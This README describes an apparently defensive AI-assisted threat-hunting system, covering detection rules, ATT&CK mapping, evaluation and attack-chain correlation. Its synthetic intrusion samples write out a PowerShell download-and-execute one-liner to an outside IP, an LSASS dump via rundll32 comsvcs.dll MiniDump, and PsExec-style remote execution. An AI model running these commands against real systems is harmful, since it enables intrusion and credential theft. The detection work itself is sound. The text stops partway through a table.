# Agentic Threat Hunter

An AI-assisted threat-hunting system that analyses security telemetry, detects
suspicious behaviour with deterministic rules, maps the evidence to MITRE ATT&CK, and
uses an LLM agent to investigate possible attack chains — where every conclusion is
traceable to a specific telemetry event.

> **Status: work in progress.** Milestones 1-8 complete: telemetry (synthetic **and
> real Microsoft Defender exports**), **10** detection rules with KQL, MITRE ATT&CK
> mapping, detector evaluation, deterministic attack-chain correlation, an autonomous
> investigation agent, calibrated report generation, a detection-engineering loop, and
> an **environment + visibility model** that reports what the system *cannot* see as
> explicitly as what it can. The agent runs in **fully deterministic mode with zero API
> keys** -- an LLM is an optional enhancement layered on top, never a requirement. See
> the [roadmap](#roadmap).

---

## Core design principle

**Deterministic detection first. AI reasoning second.**

```
Microsoft Defender export ─┐
                            ├─► Telemetry adapter ─► Normalization ─► Canonical schema
    synthetic generator  ───┘                                              │
                                                                            ▼
                                                          Existing detection engine
                                                                            │
                                                                            ▼
                                        Correlation ─► Investigation agent ─► Report
                        └──────────────── deterministic, testable ─────────┘  └─LLM─┘
```

The rules decide *what is suspicious*. The agent decides *what it means* — by calling
tools to retrieve evidence, never by being handed the dataset in a prompt. Every
statement in the final report cites `event_id`s that exist in the data. And **the
detection engine, correlator, agent, and report all run identically regardless of
whether the telemetry came from the synthetic generator or a real Defender export** —
see [Telemetry ingestion](#telemetry-ingestion) for how that guarantee is enforced.

This split is deliberate. An LLM that performs the detection itself cannot be tested,
tuned, or trusted; one that reasons over pre-computed, cited evidence can be.

---

## Repository layout

```
agentic-threat-hunter/
├── data/raw/            # generated telemetry (CSV) + ground-truth labels
├── src/ath/
│   ├── schema.py        # the telemetry contract, validated on load
│   ├── config.py        # paths + env vars (never secrets in code)
│   ├── logging_setup.py
│   ├── cli.py           # single entry point for every command
│   ├── telemetry/       # ✅ pluggable TelemetrySource: synthetic + Defender + cloud/K8s
│   │   ├── source.py    #    TelemetrySource ABC, SourceLoadResult, NormalizationIssue
│   │   ├── synthetic_source.py  # wraps the generator behind the same interface
│   │   ├── defender_source.py   # real Microsoft Defender CSV/JSON import
│   │   ├── identity.py  #    sha256 / signer / signature_status: a file vs its filename
│   │   ├── cloudtrail_source.py # AWS CloudTrail: authentication + management-API activity
│   │   ├── k8s_audit_source.py  # Kubernetes audit log: RBAC grants + pod exec
│   │   ├── normalize.py #    shared coerce_and_validate() -- one funnel, every source
│   │   └── loader.py    #    reads canonical CSVs; merge_telemetry() combines sources
│   ├── hunting/         # ✅ 16 detection rules, Finding model, hunt engine
│   │   ├── finding.py   #    Finding / Evidence / Severity
│   │   ├── base.py      #    Detector ABC, HuntConfig thresholds, registry
│   │   ├── indicators.py#    shared helpers (b64 decode, IP classification)
│   │   ├── engine.py    #    run_hunt() with per-rule error isolation
│   │   └── rules/       #    grouped by telemetry source, Sigma-style -- including
│   │                    #    aws_rules.py / k8s_rules.py over EVENT_CONTROL
│   ├── mitre/           # ✅ verified ATT&CK catalogue + evidence-gated mapper
│   │   ├── attack.py    #    Technique catalogue, Tactic, AttackMapping
│   │   └── mapper.py    #    gated rule -> technique interpretations
│   ├── evaluation/      # ✅ precision/recall vs ground truth (only reader of labels)
│   ├── correlation/     # ✅ multi-signal chain reconstruction
│   │   ├── chain.py     #    InvestigationCase, FindingLink, TimelineEntry
│   │   └── correlator.py#    scoring + structural-evidence requirement
│   ├── agent/           # ✅ autonomous investigation layer (works with NO API key)
│   │   ├── claims.py    #    Claim (FACT/INFERENCE/HYPOTHESIS) + ClaimVerifier
│   │   ├── tools.py     #    read-only ToolBox -- the agent's ONLY route to data
│   │   ├── specialists.py#   Endpoint/Identity/Network/ControlPlane/ATT&CK agents, gated
│   │   ├── orchestrator.py#  plan -> act -> verify loop; roster from ath.capabilities
│   │   ├── llm.py       #    NullLLM / ScriptedLLM / AnthropicLLM behind one interface
│   │   └── graph.py     #    optional LangGraph adapter (same logic, different runtime)
│   ├── capabilities/    # ✅ environment-driven crew assembly (Milestone 13)
│   │   ├── registry.py  #    CapabilitySpec: what each capability needs, requires_all/any
│   │   └── crew.py      #    assemble_crew(): observable_channels -> the crew that fits
│   ├── reporting/       # ✅ calibrated Markdown/JSON report generation
│   │   ├── models.py    #    Report, EvidenceAppendixEntry, RecommendedAction
│   │   ├── builder.py   #    deterministic assembly from InvestigationState
│   │   ├── language.py  #    FACT/INFERENCE/HYPOTHESIS phrasing + overclaim lint
│   │   └── markdown.py  #    Markdown renderer
│   ├── engineering/     # ✅ detection-engineering loop: propose, evaluate, iterate
│   │   ├── candidates.py#    v1/v2 candidate rules -- NEVER reads ground truth
│   │   └── harness.py   #    scoring, reusing ath.evaluation.score_rule directly
│   ├── evaluation/      # ✅ per-rule scoring + end-to-end incident benchmark
│   │   ├── evaluator.py #    precision/recall per rule (only reader of labels)
│   │   ├── incidents.py #    whole-pipeline metrics: load, noise, chain quality, cost
│   │   └── suite.py     #    the incidents this project reports itself against
│   ├── triage/          # ✅ arguing the innocent explanation, with cited evidence
│   │   ├── benign.py    #    gated benign signals + vetoes; annotates, never suppresses
│   │   └── feedback.py  #    append-only analyst verdicts + triage agreement metrics
│   └── environment/     # ✅ what is being defended, and what can be seen of it
│       ├── channels.py  #    TelemetryChannel: available / partial / absent, measured
│       ├── model.py     #    EnvironmentModel: hosts, identities, controls, unknowns
│       └── coverage.py  #    detectable / undetected / unverifiable / unobservable
├── queries/             # ✅ 16 KQL files + a KQL primer (README.md)
├── docs/
│   ├── data-dictionary.md
│   └── detection-engineering.md   # the v1->v2 walkthrough with real numbers
├── tests/               # 652 tests
└── main.py
```

### Layer responsibilities

```
Telemetry
   |
   v
Detection Rules  (deterministic, label-blind)
   |
   v
Finding objects  (evidence-backed, cannot exist without event ids)
   |
   +--> MITRE mapping   -> candidate ATT&CK interpretations, gated on evidence
   +--> Evaluation      -> precision/recall  (the ONLY reader of ground truth)
   +--> Correlation     -> InvestigationCase (multi-signal, no LLM)
            |
            v
      Investigation Orchestrator  (plan -> act -> verify, optional LLM)
            |
            +--> Specialist agents  -> Claims (FACT / INFERENCE / HYPOTHESIS)
            +--> ClaimVerifier      -> rejects anything not traceable to real telemetry
                     |
                     v
               Report builder  ->  calibrated Markdown / JSON, evidence-cited throughout
```

Each arrow is one-way. Nothing downstream can influence whether a finding is raised,
and nothing except `evaluation/` may read ground-truth labels -- enforced by an
AST-parsing test, not by discipline. The agent layer adds one more constraint of its
own: the model never sees raw telemetry, only tool results, and it can never author a
`FACT` -- enforced at claim construction, not by prompting.

---

## Quick start

```bash
git clone <repo> && cd agentic-threat-hunter
python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
pip install -r requirements.txt

python main.py generate            # build the dataset
python main.py stats               # summarise it
python main.py peek --device PC01  # walk a host's timeline

python main.py rules -v            # list detections + their false positives
python main.py hunt                # run all 8 detections
python main.py hunt --rule ATH-002 # run one rule
python main.py hunt --summary      # compact table
python main.py hunt --triage       # ...with benign/malicious disposition per finding
python main.py hunt --mitre        # findings with ATT&CK interpretations
python main.py evaluate            # precision/recall per rule
python main.py chains              # correlated investigation cases
python main.py chains --explain    # ...and why each link was made

python main.py investigate                  # autonomous investigation (uses LLM if configured)
python main.py investigate --no-llm          # force fully deterministic mode
python main.py investigate --case CASE-001 -v # verbose: show tool calls + rejections

python main.py report                        # calibrated Markdown report per case -> reports/
python main.py report --case CASE-001 --stdout # print instead of writing a file
python main.py report --json                 # also write structured JSON alongside

python main.py engineer                      # propose->evaluate->iterate: v1 vs v2 rules
python main.py engineer --json engineering.json

python main.py import-defender <dir>         # normalize a real Defender advanced-hunting export
python main.py import-defender <dir> --out-dir data/raw   # then hunt/chains/investigate/report
                                              # work exactly as they do on synthetic data

python main.py import-cloudtrail <dir>       # normalize an AWS CloudTrail export
python main.py environment                   # what is this environment, and what is unknowable?
python main.py visibility                    # telemetry channels + 4-state ATT&CK coverage
python main.py visibility --all              # ...including techniques already covered

python main.py benchmark                     # end-to-end incident suite: is this useful?
python main.py benchmark --json bench.json   # ...as structured output

python main.py feedback --finding-id <id> --verdict false_positive --analyst sam
python main.py feedback                      # triage agreement + measured FP cost by rule

pytest -q                          # 652 tests
```

No API key is required for anything built so far — the entire deterministic pipeline
runs offline.

---

## The dataset

A synthetic but realistic corporate morning: 8 hosts, 8 accounts, ~1,085 events over
four hours, split into three tables that mirror the Microsoft Defender advanced-hunting
schema (`DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceLogonEvents`).

Full field-by-field explanation: **[docs/data-dictionary.md](docs/data-dictionary.md)**

| Table | Rows |
| ----- | ---- |
| process | 429 |
| network | 389 |
| logon | 267 |

**Under 5% of events are part of any labelled scenario** (enforced by a unit test).
The dataset contains 79 PowerShell executions, nearly all benign — so "PowerShell ran"
can never be a detection.

It also contains a deliberate **benign look-alike**: an IT administrator running an
encoded PowerShell inventory script via patch-management tooling, which then contacts a
Microsoft endpoint and authenticates to three servers in a row. A naive rule fires on
it and is wrong. This is what makes false-positive analysis in later milestones real
rather than decorative.

### Example: the simulated intrusion on PC01

```
09:12:04  PC01  jdoe        OUTLOOK.EXE → WINWORD.EXE     Invoice_Q3_2026.docm
09:12:41  PC01  jdoe        WINWORD.EXE → powershell.exe  -nop -w hidden -enc SQBFAFgA...
09:12:43  PC01  jdoe        powershell.exe → 185.220.101.47:80
09:13:10  PC01  jdoe        powershell.exe → 185.220.101.47:443   (repeats every 5 min)
09:15:03  PC01  jdoe        powershell.exe → whoami.exe /all
09:15:20  PC01  jdoe        powershell.exe → net group "Domain Admins" /domain
09:18:22  PC01  jdoe        powershell.exe → rundll32.exe comsvcs.dll, MiniDump 712 ...
09:28-30  FS02  svc_backup  14 × failed network logon from 10.10.20.15 (PC01)
09:33:47  FS02  svc_backup  successful network logon from 10.10.20.15
09:34:12  FS02  svc_backup  services.exe → cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\...
09:35:40  FS02  svc_backup  cmd.exe → powershell.exe Compress-Archive D:\Finance\*
09:37:05  FS02  svc_backup  powershell.exe → 185.220.101.47:443
```

The `-enc` blob is genuine base64 of UTF-16LE, exactly as `powershell.exe
-EncodedCommand` expects, and decodes to a real downloader one-liner. A unit test
asserts the round-trip, so the decoder written in a later milestone is doing real work.

---

## Telemetry ingestion

Everything from detection onward is written against one canonical schema
(`ath.schema`). A `TelemetrySource` is the only thing that needs to know where
telemetry actually came from; its entire job is producing that schema.

```
src/ath/telemetry/
├── source.py            TelemetrySource ABC, SourceLoadResult, NormalizationIssue
├── synthetic_source.py  wraps the existing generator -- zero behaviour change
├── defender_source.py   reads real Microsoft Defender advanced-hunting exports
└── normalize.py         coerce_and_validate() -- the ONE funnel every source passes through
```

### Schema verified against Microsoft Learn, not memory

`DeviceProcessEvents`, `DeviceNetworkEvents`, and `DeviceLogonEvents` were fetched
directly from `learn.microsoft.com` (not recalled) before writing a single line of the
adapter. Two things that verification caught, which would otherwise have been silent
bugs:

- **`DeviceNetworkEvents` has no `AccountName` column** — only
  `InitiatingProcessAccountName`. The adapter maps our `user` field for network events
  from that column specifically.
- **`LogonType` is a string**, and Microsoft documents exactly five values:
  `Interactive`, `Remote interactive (RDP)`, `Network`, `Batch`, `Service`. Our
  canonical schema stores the numeric Windows code (2/3/4/5/10), so the adapter is the
  one place that translates between the two vocabularies
  (`LOGON_TYPE_STRING_TO_CODE`).

### Real data is messy in a way synthetic data never is

The synthetic generator is trusted — a malformed row from it is a bug in *our own*
code, and it's correct to crash loudly. An actual export is not trusted the same way: an
unparseable timestamp or an unrecognised `LogonType` value is a fact about the world,
not a bug in this project. So the adapter **drops** malformed rows rather than raising,
and reports exactly why:

```
$ python main.py import-defender ./my_export/

7 row(s) normalised, 2 dropped (of 9 read)
  process      3 row(s)
  network      3 row(s)
  logon        1 row(s)

2 row(s) dropped during normalization:
  - logon [Timestamp] (DeviceLogonEvents.csv#row=2): unparseable timestamp: 'not-a-timestamp'
  - logon [LogonType] (DeviceLogonEvents.csv#row=1, ReportId=700002): unrecognised LogonType value: 'Explicit'
```

Both the count and the reason are real numbers from this project's own test fixture
(`tests/fixtures/defender_export/`), not illustrative ones.

### `ReportId` is not a safe unique id

Microsoft's own documentation says `ReportId` is "based on a repeating counter" and
must be combined with `DeviceName` and `Timestamp` to identify a unique event. Rather
than reconstruct uniqueness from three fields, the adapter mints its own `event_id`
(guaranteed unique by construction, like the synthetic generator's `evt-NNNNNN`) and
preserves the original `ReportId` — plus the source file — in a new `source_ref`
provenance column, so a finding can always be traced back to the exact original record.

### Provenance survives all the way to the report

`source` and `source_ref` were added to the **canonical schema itself** (`ath.schema`),
not bolted on downstream — every table, from either source, carries them. This is what
let the evidence appendix and the report header become provenance-aware:

```
> This report was produced by an automated investigation over telemetry
> from: **defender_export**. It presents evidence-backed findings for analyst
> review and does not authorise or perform any response action.
```

**A real bug this caught during development:** the report's limitations section
originally hardcoded *"Telemetry in this project is synthetic..."* unconditionally —
which would have made every report about real, imported data lie about its own origin.
Caught by the integration test below, fixed by deriving the claim from
`report.data_sources` instead of asserting it. Both directions are now regression-tested:
a synthetic report must say synthetic, an imported report must not.

### The existing pipeline runs completely unchanged

`tests/test_defender_integration.py` is the capstone proof: a fixture shaped exactly
like a real Defender export (verified column names, a real base64 `-EncodedCommand`
payload, a genuine TEST-NET-avoiding public IP) runs through **hunt → correlate →
investigate → report** with *zero modifications* to any of those four modules.

```
ATH-001 HIGH   CORP-WKS01/rsmith: Office application spawned a script interpreter
ATH-002 HIGH   CORP-WKS01/rsmith: Encoded PowerShell command execution
ATH-003 HIGH   CORP-WKS01/rsmith: Script interpreter connected to an external host
ATH-009 MEDIUM CORP-WKS01/rsmith: Macro-enabled document opened via email client

CASE-001: 4 findings correlated, tactics: Execution -> Stealth -> Command and Control
investigation: status=complete, 0 rejected claims
report: data_sources=('defender_export',)
```

The two malformed rows dropped at import (`svc_report`/`CORP-FS01`) never reach
detection at all — normalization happens once, at the front door.

### Evaluate needs labels; everything else doesn't

Real imports have no ground truth — there is no answer key for an actual intrusion.
`evaluate` fails with a specific, honest message instead of the generic "run generate
first" text:

```
$ python main.py evaluate
ERROR: `evaluate` requires labelled ground truth, which only the synthetic generator
produces (`python main.py generate`). Telemetry imported via `import-defender` has no
labels by design -- real data has no answer key -- so precision/recall cannot be
computed for it; hunt/chains/investigate/report all work normally without this file.
```

---

## Detections

Eight deterministic rules. Each declares the telemetry fields it depends on and its
known false positives **as code**, so those caveats travel with every finding and
cannot be dropped by the time a report is written.

| Rule | Detects | Severity | MITRE (mapped in M3) |
| ---- | ------- | -------- | -------------------- |
| ATH-001 | Office application spawned a script interpreter | HIGH | T1204.002 / T1059.001 |
| ATH-002 | Encoded PowerShell, **decoded and graded** by payload | LOW→HIGH | T1027 / T1059.001 |
| ATH-003 | Script interpreter connected to an external host | MED→HIGH | T1071.001 / T1105 |
| ATH-004 | LSASS credential access indicators | CRITICAL | T1003.001 |
| ATH-005 | Failed logon burst followed by success | HIGH→CRITICAL | T1110 |
| ATH-006 | Account authenticated from a host it does not own | HIGH | T1021.002 / T1078 |
| ATH-007 | Remote service execution (PsExec-style) | MED→HIGH | T1569.002 |
| ATH-008 | Bulk archive staged into a temp directory | MED→HIGH | T1560.001 |
| ATH-009 | Macro-enabled document opened via email client | MEDIUM | T1204.002 |
| ATH-010 | Sequence of ≥2 discovery commands from one parent process | MEDIUM | T1033 / T1069.002 / T1482 |

Every rule has a matching `.kql` file in [`queries/`](queries/) written against the real
Microsoft Defender advanced-hunting schema, plus a
[KQL primer](queries/README.md) covering `where`, `project`, `extend`, `summarize`,
`join`, `ago()` and the `contains` vs `has` distinction. A unit test asserts the two
layers cannot drift apart.

### Results on the shipped dataset

```
$ python main.py hunt --summary
Rules run  : 10    Findings : 13
Severity   : CRITICAL=2  HIGH=6  MEDIUM=4  LOW=1
```

13 findings from 1,085 events: **11 true positives** covering the intrusion end to
end -- all 10 labelled attack stages, up from 8/10 before the detection-engineering
loop -- and **2 known false positives** on the benign IT-automation look-alike, both
correctly graded below the real activity.

### Design choices worth explaining

**Findings cannot exist without evidence.** `Finding.event_ids` is *derived* from its
`evidence` tuple and validated as non-empty at construction. There is no code path that
produces an unevidenced claim.

**Severity is graded by what the payload does, not by pattern count.** ATH-002 decodes
the base64 and inspects it: the attacker's downloader is HIGH, the administrator's
inventory script is LOW. Encoding alone is weak evidence and treating it as HIGH would
train an analyst to ignore the rule.

**A beacon is one finding, not forty.** ATH-003 groups by (host, process, destination),
so six C2 callbacks plus the initial download become a single finding with seven pieces
of evidence. Alert volume is a real operational cost.

**Ownership modelling beats counting.** The obvious lateral-movement rule — "alert when
an account touches N+ hosts" — fires on the IT admin doing her job and *misses* the
attacker, who touches exactly one host. ATH-006 instead asks whether a credential is
being used from a machine where that account has no session. It catches the attacker
and stays quiet on the admin.

**Thresholds are configuration.** Every number lives on `HuntConfig`, so tests can prove
boundary behaviour (`bruteforce_min_failures=1` floods with benign typo bursts) and
tuning never requires editing detection logic.

---

## MITRE ATT&CK mapping

Verified against **ATT&CK for Enterprise v19** (28 April 2026). Note that v19 retired
the `Defense Evasion` tactic: `TA0005` was kept but renamed **Stealth**, and a new
`TA0112 Defense Impairment` was added. This project uses the current names.

### Tactic / technique / sub-technique / TTP

| Term | Meaning | Example |
| ---- | ------- | ------- |
| **Tactic** | The adversary's *goal* -- the why | Credential Access |
| **Technique** | The *how* | T1003 OS Credential Dumping |
| **Sub-technique** | A more specific how | T1003.001 LSASS Memory |
| **TTP** | Tactics, Techniques and **Procedures** -- the procedure is the concrete implementation | `rundll32.exe comsvcs.dll, MiniDump` |

You detect *procedures*; you communicate in *techniques*; you prioritise by *tactic*.

### "Suspicious" is not the same claim as "technique X"

```
"this event looks suspicious"            -> a Finding      (observation)
"this is consistent with T1027.010"      -> an AttackMapping (interpretation)
```

ATT&CK describes what adversaries do. It does **not** certify that any given event was
adversarial: an administrator running an encoded PowerShell script genuinely *is*
performing T1027.010 and is not an attacker. Every mapping therefore carries a
`confidence` and a `reason`, and is worded "consistent with", never "proves".

### Mappings implemented

| Rule | Technique | Tactic | Gate (evidence required) |
| ---- | --------- | ------ | ------------------------ |
| ATH-001 | T1204.002 Malicious File | Execution | always (medium -- file itself unobserved) |
| ATH-001 | T1059.001 PowerShell / T1059.003 Windows Command Shell | Execution | which interpreter was spawned |
| ATH-002 | T1059.001 PowerShell | Execution | always |
| ATH-002 | T1027.010 Command Obfuscation | Stealth | always |
| ATH-002 | T1105 Ingress Tool Transfer | C2 | **decoded payload fetches remote code** |
| ATH-003 | T1071.001 Web Protocols | C2 | destination port is 80/443/8080/8443 |
| ATH-003 | T1105 Ingress Tool Transfer | C2 | cleartext HTTP or an observed URL |
| ATH-004 | T1003.001 LSASS Memory | Credential Access | LSASS dump indicator present |
| ATH-004 | T1218.011 Rundll32 | Stealth | dump proxied through rundll32 + comsvcs.dll |
| ATH-005 | T1110.001 Password Guessing | Credential Access | always |
| ATH-005 | T1078 Valid Accounts | multi | **the burst succeeded** |
| ATH-006 | T1021.002 SMB/Windows Admin Shares | Lateral Movement | logon type 3 |
| ATH-006 | T1021.001 Remote Desktop Protocol | Lateral Movement | logon type 10 |
| ATH-006 | T1078 Valid Accounts | multi | always |
| ATH-007 | T1569.002 Service Execution | Execution | always |
| ATH-007 | T1021.002 SMB/Windows Admin Shares | Lateral Movement | admin-share redirection |
| ATH-008 | T1560.001 Archive via Utility | Collection | always |
| ATH-008 | T1074.001 Local Data Staging | Collection | destination is a staging path |
| ATH-009 | T1204.002 Malicious File | Execution | always |
| ATH-010 | T1033 System Owner/User Discovery | Discovery | whoami/systeminfo/hostname/quser matched |
| ATH-010 | T1069.002 Domain Groups | Discovery | net.exe matched |
| ATH-010 | T1482 Domain Trust Discovery | Discovery | nltest matched |

**Two techniques are deliberately never asserted.** No Exfiltration technique, because
the data shows an archive being created and, separately, an outbound connection -- it
never shows the archive's bytes leaving. And no T1566 Spearphishing, because the
dataset has no email telemetry -- ATH-009 fires on Outlook opening a macro-capable
file, but that observes the *open*, not the *delivery*, so it maps to T1204.002
(User Execution) rather than reaching for the Initial Access tactic. Both omissions
are covered by tests.

**ATT&CK v19 (28 April 2026) added a Discovery-tactic trio for ATH-010**: T1033
(System Owner/User Discovery), T1069.002 (Permission Groups Discovery: Domain Groups),
and T1482 (Domain Trust Discovery) -- each gated on which specific binary the finding
actually matched, so a finding that only observed `whoami.exe` does not also claim
`nltest`'s technique.

**Invented technique IDs are structurally impossible.** `AttackMapping` validates its
`technique_id` against a hand-verified catalogue at construction time, so a typo raises
rather than shipping.

---

## Detector evaluation

```
$ python main.py evaluate

Rule        TP  FP  FN  Precision   Recall     F1   Notes
ATH-001      1   0   0       1.00     1.00   1.00
ATH-002      1   1   0       0.50     1.00   0.67   1 FP = benign look-alike
ATH-003      2   1   0       0.67     1.00   0.80   1 FP = benign look-alike
ATH-004      1   0   0       1.00     1.00   1.00
ATH-005      1   0   0       1.00     1.00   1.00
ATH-006      1   0   0       1.00     1.00   1.00
ATH-007      1   0   0       1.00     1.00   1.00
ATH-008      1   0   0       1.00     1.00   1.00
ATH-009      1   0   0       1.00     1.00   1.00
ATH-010      1   0   0       1.00     1.00   1.00
OVERALL     11   2           0.85

Attack-stage coverage: 10/10 (100%)
```

**Defining a match is the hard part**, and row-level scoring would be misleading here.
ATH-005 emits *one* finding covering fifteen logon rows; ATH-006 flags one of those same
rows. Scored row-wise, ATH-006 would appear to "miss" fourteen events it was never built
to see, and its recall would collapse to 0.07. So:

* **Precision is finding-level** -- one alert costs one triage, whether it contains one
  event or fifteen.
* **Recall is opportunity-level** -- each rule declares which attack stages it targets
  (`RULE_COVERAGE`), and recall asks how many of *those* it caught.
* **Portfolio stage coverage is reported separately**, because every rule can score 1.00
  recall while the rule set as a whole misses whole stages.

Stage coverage now reads **10/10** -- it was **8/10** before Milestone 6. `ATH-009`
and `ATH-010` closed exactly the two gaps this section used to describe (`Outlook ->
Word` and `whoami`/`net group` enumeration), via the detection-engineering loop
documented below, not by lowering the bar for what counts as covered.

### Simple indicator vs. context-aware detection

The clearest demonstration in the project. Two events, both encoded PowerShell, both
tripping ATH-002:

| | Attacker (PC01) | Administrator (PC07) |
| --- | --- | --- |
| Command | `powershell -nop -w hidden -enc SQBFAFgA...` | `powershell -NonInteractive -EncodedCommand RwBl...` |
| Decoded | `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/a.ps1')` | `Get-WmiObject Win32_QuickFixEngineering \| Select HotFixID` |
| Parent | `WINWORD.EXE` | `CcmExec.exe` (patch management) |
| Severity | **HIGH** | **LOW** |
| ATT&CK | T1059.001, T1027.010, **T1105** | T1059.001, T1027.010 |

A rule that says "encoded PowerShell = malicious" gets both wrong. Context separates
them, and the context is free -- it is already in the telemetry:

```
encoded PowerShell alone            -> weak     (fires on IT automation)
+ Office parent                     -> strong   (Word does not run scripts)
+ decoded payload fetches remote code -> stronger
+ external connection from that PID -> chain
```

That is why ATH-002 decodes the payload rather than pattern-matching the flag, and why
`T1105` is gated on what the payload *does*. The false positive is left in the dataset
on purpose: a detection portfolio with no false positives has not been tested.

---

## Detection-engineering loop

`python main.py engineer` runs the workflow that produced `ATH-009` and `ATH-010`:
propose a candidate rule, measure it against this project's own telemetry, inspect the
failures, tighten, remeasure. Full walkthrough with every number:
**[docs/detection-engineering.md](docs/detection-engineering.md)**.

### The boundary, enforced the same way it is everywhere else in this project

```
src/ath/engineering/
├── candidates.py   proposal logic -- NEVER reads ground truth (AST-tested)
└── harness.py      scoring -- explicitly permitted, reuses ath.evaluation.score_rule()
```

A candidate is generalizable security reasoning applied to raw telemetry, not a rule
fitted to the answer key. Only the harness's scoring step looks at labels, and it does
so through the *exact same* `score_rule()` function that scores the permanent rule
set -- a candidate and a registered rule are measured identically, by construction.

### Real numbers, not illustrative ones

```
$ python main.py engineer

--- Gap: 1-initial-access ---
  v1 [CAND-INITACCESS-v1] Office document opened by an email client
      TP=1  FP=29  precision=0.03  stage_covered=True
      false positive examples:
        - ...WINWORD.EXE opened "C:\Users\achen\Documents\Notes.docx" (x3, PC03)
        - ...WINWORD.EXE opened "C:\Users\adm_sarah\Documents\Notes.docx" (PC07)
  v2 [CAND-INITACCESS-v2] Macro-enabled document opened by an email client
      TP=1  FP=0  precision=1.00  stage_covered=True
  verdict: v1 produced 1 true positive(s) and 29 false positive(s) (precision 0.03).
           v2 removes 29 of those false positive(s) (precision 0.03 -> 1.00) while
           still covering 1-initial-access.
  status: promoted to permanent rule ATH-009

--- Gap: 5-discovery ---
  v1 [CAND-DISCOVERY-v1] Discovery command executed
      TP=3  FP=39  precision=0.07  stage_covered=True
  v2 [CAND-DISCOVERY-v2] Sequence of discovery commands from one parent process
      TP=1  FP=0  precision=1.00  stage_covered=True
  verdict: v1 produced 3 true positive(s) and 39 false positive(s) (precision 0.07).
           v2 removes 39 of those false positive(s) (precision 0.07 -> 1.00) while
           still covering 5-discovery.
  status: promoted to permanent rule ATH-010
```

Every one of those false positives is a real row this project's own benign telemetry
generator already produces -- `Notes.docx` opened via Outlook, lone `ipconfig /all`
calls during routine troubleshooting. They were not manufactured for the demo; they
are what the naive version of each rule actually does against realistic background
noise.

### What one condition bought each time

**Initial Access:** restrict to file extensions that can *structurally* carry a macro
(`.docm`/`.dotm`/`.xlsm`/`.xlsb`/`.pptm`/`.ppsm`). A `.docx` cannot contain a macro
regardless of content -- this is a fact about the Office Open XML format, not a
threshold tuned to this dataset.

**Discovery:** require **two or more distinct** discovery binaries sharing the **same
parent process** within a **5-minute window**, rather than alerting on any one binary
name. Every discovery tool here is also an everyday troubleshooting command; the
distinctive shape is the *sequence*, run from *one shell*.

### Promotion is a manual step, not a self-granted one

The harness measures; it does not write to the registered rule set. `ATH-009` and
`ATH-010` were added to `ath.hunting.rules` exactly like any other rule -- registered
with `@register`, given KQL equivalents, false-positive documentation, and tests. The
harness's `_PROMOTIONS` mapping records, as a fact about this project's history, which
candidates were subsequently accepted; it has no mechanism to promote a candidate
itself.

### What this closed, concretely

The correlated attack chain now spans all 10 labelled stages end to end:

```
Execution -> Persistence -> Stealth -> Credential Access -> Discovery
  -> Lateral Movement -> Collection -> Command and Control
```

`Discovery` was invisible to every chain before this loop. It appears now because
`ATH-010`'s finding shares process lineage with the rest of the intrusion and
correlates into the same case automatically -- no change to the correlator was needed.

---

## Attack-chain correlation

Findings are grouped into `InvestigationCase` objects by **deterministic evidence** --
no LLM, no heuristic narrative.

### Why not just group by time

```python
if abs(a.time - b.time) < timedelta(minutes=30):   # DON'T
    same_case(a, b)
```

On this dataset that yields one giant case containing the intrusion *and* the
administrator's legitimate work, because everything happened the same morning. Time is
the weakest available signal.

### The scoring model

Two findings link only when they clear **both** bars: score >= 5 **and** at least one
*structural* signal.

| Signal | Weight | Structural? |
| ------ | ------ | ----------- |
| `shared_evidence` -- the same event supports both | +3 | yes |
| `same_process` -- same (host, PID) | +3 | yes |
| `process_lineage` -- one process is the other's parent | +3 | yes |
| `host_movement` -- one finding's host is the other's auth source/target | +3 | yes |
| `auth_then_exec` -- successful logon, then service execution on that host | +3 | yes |
| `same_device` | +2 | no |
| `same_user` | +2 | no |
| `temporal_close` (<=10 min) / `temporal_near` (<=60 min) | +2 / +1 | no |

The weights matter less than the shape: **no combination of circumstantial signals can
create a link.** Same host + same user + close in time sums to 6 -- clearing the score
bar -- and is still refused, because on one workstation those three facts are true of
nearly every pair of alerts. `--allow-circumstantial` disables the guard so you can see
the naive behaviour it prevents.

### What could still correlate wrongly

Stated plainly rather than buried: jump boxes and terminal servers legitimately generate
`host_movement` and `auth_then_exec` between unrelated sessions; Windows recycles PIDs,
so `same_process` can eventually join different processes (real EDR uses a process GUID,
which our telemetry lacks); cases are connected components, so one bad link merges two
cases; and busy service accounts over-group via `same_user`.

### Example: telemetry -> finding -> ATT&CK -> chain

**1. Raw telemetry** (`data/raw/process_events.csv`, event `evt-000322`):

```
timestamp=2026-08-17T09:12:41Z  device=PC01  user=jdoe
process_name=powershell.exe  parent_process_name=WINWORD.EXE
command_line=powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
```

**2. Findings** -- two rules fire on this one event:

```
[HIGH] ATH-001 Office application spawned a script interpreter   evidence: evt-000322
[HIGH] ATH-002 Encoded PowerShell command execution              evidence: evt-000322
       decoded: IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/a.ps1')
```

**3. ATT&CK interpretation** (gated on that decoded payload):

```
T1204.002 User Execution: Malicious File   [Execution]  medium
T1059.001 Command and Scripting Interpreter: PowerShell  [Execution]  high
T1027.010 Obfuscated Files or Information: Command Obfuscation  [Stealth]  high
T1105     Ingress Tool Transfer  [Command and Control]  medium
```

**4. Correlated chain** (`python main.py chains`):

```
CASE-001  [CRITICAL]  confidence=high
  window   : 09:12:04 -> 09:38:10 (1566s)
  hosts    : FS02, PC01        accounts : jdoe, svc_backup
  tactics  : Execution -> Persistence -> Stealth -> Credential Access -> Discovery
             -> Lateral Movement -> Collection -> Command and Control

  time     rule     severity  user        host / movement  technique                  events
  09:12:04 ATH-009  MEDIUM    jdoe        PC01             T1204.002                  evt-000320
  09:12:41 ATH-001  HIGH      jdoe        PC01             T1059.001,T1204.002        evt-000322
  09:12:41 ATH-002  HIGH      jdoe        PC01             T1027.010,T1059.001,T1105  evt-000322
  09:12:43 ATH-003  HIGH      jdoe        PC01             T1071.001,T1105            evt-000323 (+6)
  09:15:03 ATH-010  MEDIUM    jdoe        PC01             T1033,T1069.002,T1482      evt-000332 (+2)
  09:18:22 ATH-004  CRITICAL  jdoe        PC01             T1003.001,T1218.011        evt-000344
